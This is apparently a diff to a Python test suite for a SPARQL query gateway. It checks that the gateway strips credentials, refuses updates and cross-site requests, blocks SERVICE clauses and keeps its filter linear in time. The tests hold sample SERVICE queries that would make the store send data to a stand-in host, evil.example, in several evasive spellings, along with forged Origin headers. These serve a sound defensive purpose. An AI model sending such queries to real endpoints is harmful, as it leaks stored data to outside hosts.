@@ -6,9 +6,12 @@ store that records what reaches it, and pins what makes the endpoint safe to
 open to the dashboard's users:
 
 - only a query ever reaches the store — as a fresh form POST holding nothing
-  but `query`, with the caller's Accept and never their Authorization header
-  (nor the store's access token, should a caller send one);
-- every way of sending a SPARQL Update is refused before the store is asked;
+  but `query` and the dataset it names (default-/named-graph-uri), with the
+  caller's Accept and never their Authorization header (nor the store's
+  access token, nor any other argument a caller sends);
+- every way of sending a SPARQL Update is refused before the store is asked,
+  and so is a SERVICE clause (the store would call another endpoint with its
+  data) and a query a browser sends from another site;
 - the store's answer comes back as it gave it, an error included, but never as
   HTML on the dashboard's origin;
 - without a query a browser gets the page and any other client a Service
@@ -22,6 +25,7 @@ import http.client
 import importlib.util
 import json
 import os
+import socket
 import sys
 import tempfile
 import threading
@@ -120,8 +124,9 @@ def test_query_reaches_the_store_alone(c: Client):
     FakeStore.calls.clear()
     FakeStore.reply = (200, "text/csv", b"class\nurn:x\n")
     status, headers, body = c.request(
-        "POST", "/sparql?access-token=leaked",
-        body=urllib.parse.urlencode({"query": QUERY, "default-graph-uri": "urn:g"}),
+        "POST", "/sparql?access-token=leaked&named-graph-uri=urn:n1",
+        body=urllib.parse.urlencode([("query", QUERY), ("default-graph-uri", "urn:g"),
+                                     ("named-graph-uri", "urn:n2"), ("timeout", "999s")]),
         headers={**FORM, "Accept": "text/csv", "Authorization": "Basic dXNlcjpwdw=="})
     assert status == 200, status
     assert body == b"class\nurn:x\n", body
@@ -130,11 +135,16 @@ def test_query_reaches_the_store_alone(c: Client):
     assert len(FakeStore.calls) == 1, FakeStore.calls
     call = FakeStore.calls[0]
     assert call["method"] == "POST" and call["path"] == "/", call
-    assert urllib.parse.parse_qs(call["body"]) == {"query": [QUERY]}, call["body"]
+    # The query and the dataset it names, nothing else: not the token, not
+    # the extra argument.
+    assert urllib.parse.parse_qs(call["body"]) == {
+        "query": [QUERY], "default-graph-uri": ["urn:g"],
+        "named-graph-uri": ["urn:n1", "urn:n2"]}, call["body"]
     assert call["headers"]["accept"] == "text/csv", call["headers"]
     assert call["headers"]["content-type"] == "application/x-www-form-urlencoded"
     assert "authorization" not in call["headers"], call["headers"]
-    print("ok - only the query and its Accept reach the store; credentials and tokens stay behind")
+    print("ok - only the query, its dataset and its Accept reach the store; "
+          "credentials, tokens and other arguments stay behind")
 
 
 def test_every_protocol_form_of_a_query(c: Client):
@@ -197,15 +207,117 @@ def test_malformed_requests(c: Client, wg):
     resp.read()
     conn.close()
     assert resp.status == 411, resp.status
-    status, _h, data = c.request("POST", "/sparql", body="query=ASK%7B%7D",
-                                 headers={**FORM, "Content-Length": "fifteen"})
-    assert status == 400 and "not a number" in json.loads(data)["error"], (status, data)
+    # A length too long even to convert is too large, not a crash.
+    status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D",
+                               headers={**FORM, "Content-Length": "9" * 5000})
+    assert status == 413, status
+    for bogus in ("fifteen", "-1", "1_5", "+15"):
+        status, _h, data = c.request("POST", "/sparql", body="query=ASK%7B%7D",
+                                     headers={**FORM, "Content-Length": bogus})
+        assert status == 400 and "not a number" in json.loads(data)["error"], (bogus, status, data)
     assert not FakeStore.calls
     # An empty body is fine when the query rides in the URL.
     FakeStore.reply = (200, "application/sparql-results+json", b'{"boolean":true}')
     status, _h, _d = c.request("POST", "/sparql?query=ASK%7B%7D")
     assert status == 200 and len(FakeStore.calls) == 1, status
     print("ok - an empty, doubled, oversized, chunked or mislabelled request is refused")
+
+
+def test_nothing_leaves_through_the_store(c: Client):
+    """A SERVICE clause makes the store call another endpoint with its own
+    data, so it is refused, however it is spelled; what merely looks like it
+    is not. A query a browser sends from another site is refused too: that is
+    how a page the user visits would fire one with the user's credentials."""
+    calls_out = [
+        "SELECT * WHERE { SERVICE <http://evil.example/sparql> { ?s ?p ?o } }",
+        "select * { service silent <http://evil.example/> {} }",
+        "SELECT * { ?s ?p ?o.SERVICE <http://evil.example/> {} }",
+        "SELECT * { ?s ex:a\\# ?o . SERVICE <http://evil.example/> {} }",
+        "SELECT * { \\u0053ERVICE <http://evil.example/> {} }",
+        'SELECT * { ?s ?p "x\\u0022" SERVICE <http://evil.example/> {} "\\u0022" }',
+        "SELECT * { ?s ?p ?o } # a comment ends here\nSERVICE ?endpoint {}",
+    ]
+    for query in calls_out:
+        FakeStore.calls.clear()
+        status, _h, data = c.request("POST", "/sparql", body=urllib.parse.urlencode({"query": query}),
+                                     headers=FORM)
+        assert status == 403 and "SERVICE" in json.loads(data)["error"], (query, status)
+        assert not FakeStore.calls, f"reached the store: {query!r}"
+    looks_like_it = [
+        "SELECT ?service WHERE { ?s ?p ?service }",
+        "SELECT * WHERE { GRAPH <file:home/Vertr\\u00E4ge/service-vertrag.nt> { ?s ?p ?o } }",
+        "PREFIX ex: <http://ex/> SELECT * { ?s ex:service ?o ; ex:a.SERVICE ?x }",
+        'SELECT * { ?s ?p "customer service"@en , <http://ex/service> } # service',
+        "PREFIX schema: <http://schema.org/> SELECT * { ?s a schema:Service }",
+    ]
+    FakeStore.reply = (200, "application/sparql-results+json", b'{"head":{},"results":{"bindings":[]}}')
+    for query in looks_like_it:
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body=urllib.parse.urlencode({"query": query}),
+                                   headers=FORM)
+        assert status == 200 and len(FakeStore.calls) == 1, (query, status)
+    here = f"http://127.0.0.1:{c.port}"
+    for headers in ({"Sec-Fetch-Site": "cross-site"}, {"Sec-Fetch-Site": "same-site"},
+                    {"Origin": "https://evil.example"}, {"Origin": "null"}):
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D", headers={**FORM, **headers})
+        assert status == 403 and not FakeStore.calls, (headers, status)
+        status, _h, _d = c.request("GET", "/sparql?query=ASK%7B%7D", headers=headers)
+        assert status == 403 and not FakeStore.calls, (headers, status)
+    # Behind a proxy, the browser's scheme and host arrive as the first
+    # X-Forwarded-Proto / X-Forwarded-Host entries, which no other site can
+    # set. Same origin means both match: another host, the same host over
+    # another scheme, a later hop of the chain, or an Origin that does not
+    # parse, is another site.
+    proxied = {"X-Forwarded-Host": "dash.example", "X-Forwarded-Proto": "https"}
+    for headers in ({"Origin": "https://evil.example", **proxied},
+                    {"Origin": "http://dash.example", **proxied},
+                    {"Origin": "https://dash.example", "X-Forwarded-Proto": "https",
+                     "X-Forwarded-Host": "evil.example, dash.example"},
+                    {"Origin": "http://[::1"}):
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D", headers={**FORM, **headers})
+        assert status == 403 and not FakeStore.calls, (headers, status)
+    for headers in ({"Sec-Fetch-Site": "same-origin", "Origin": here}, {"Sec-Fetch-Site": "none"},
+                    {"Origin": here}, {"Origin": "https://dash.example", **proxied},
+                    {}):
+        FakeStore.calls.clear()
+        status, _h, _d = c.request("POST", "/sparql", body="query=ASK%7B%7D", headers={**FORM, **headers})
+        assert status == 200 and len(FakeStore.calls) == 1, (headers, status)
+    # The page itself still opens from a link on another site.
+    status, _h, body = c.request("GET", "/sparql", headers={"Accept": "text/html",
+                                                            "Sec-Fetch-Site": "cross-site"})
+    assert status == 200 and b"<retinue-sparql-doc" in body, status
+    print("ok - SERVICE and cross-site queries are refused; look-alikes, programs and the page are not")
+
+
+def test_the_service_check_stays_linear(wg):
+    """The check runs on every query a signed-in client sends, up to the body
+    limit: no input may make it slow. (Its first form retried a prefixed-name
+    pattern at every position of a long run, ~30 s for 64 KB.) Judged by how
+    the time grows with the input, not by the clock, so a slow runner cannot
+    fail it: four times the input costs about four times as long when the
+    check is linear, and about sixteen times when it is quadratic."""
+    import time
+
+    def best_of_three(text):
+        times = []
+        for _ in range(3):
+            started = time.perf_counter()
+            wg._sparql_calls_out(text)
+            times.append(time.perf_counter() - started)
+        return min(times)
+
+    worst = 0.0
+    for unit in ("a.", "a-", "a:", '"""', "'a", "<a", "\\u0041", "ex:%41", "#", 'a.b:c-"x"<y>', "?a.", "@a-"):
+        def query(size):
+            return "SELECT * WHERE { " + unit * (size // len(unit)) + " }"
+        small, large = best_of_three(query(64 * 1024)), best_of_three(query(256 * 1024))
+        growth = large / max(small, 1e-4)
+        worst = max(worst, growth)
+        assert growth < 11, (f"the SERVICE check grows {growth:.1f}x from 64 KB to 256 KB of "
+                            f"{unit!r} ({small * 1000:.0f} -> {large * 1000:.0f} ms): not linear")
+    print(f"ok - the SERVICE check stays linear (worst growth for 4x the input: {worst:.1f}x)")
 
 
 def test_store_answers_pass_through_but_never_as_html(c: Client):
@@ -287,16 +399,20 @@ def main() -> int:
         wg.DOCS_DIR = docs
         wg.WEBAPP_DIR = webapp
         gateway = _serve(wg.Handler)
-        # A port nothing listens on, for the store-down case.
-        probe = ThreadingHTTPServer(("127.0.0.1", 0), FakeStore)
-        dead_port = probe.server_address[1]
-        probe.server_close()
+        # A port nothing listens on, for the store-down case: bound for the
+        # whole run but never listening, so it refuses connections and no
+        # other process can take it in the meantime.
+        dead = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        dead.bind(("127.0.0.1", 0))
+        dead_port = dead.getsockname()[1]
         c = Client(gateway.server_address[1])
         try:
             test_query_reaches_the_store_alone(c)
             test_every_protocol_form_of_a_query(c)
             test_updates_are_refused_before_the_store(c)
             test_malformed_requests(c, wg)
+            test_nothing_leaves_through_the_store(c)
+            test_the_service_check_stays_linear(wg)
             test_store_answers_pass_through_but_never_as_html(c)
             test_without_a_query_the_endpoint_describes_itself(c)
             test_store_down_is_a_502(c, wg, dead_port)
@@ -307,6 +423,7 @@ def main() -> int:
         finally:
             gateway.shutdown()
             store.shutdown()
+            dead.close()
     print("PASS")
     return 0
 
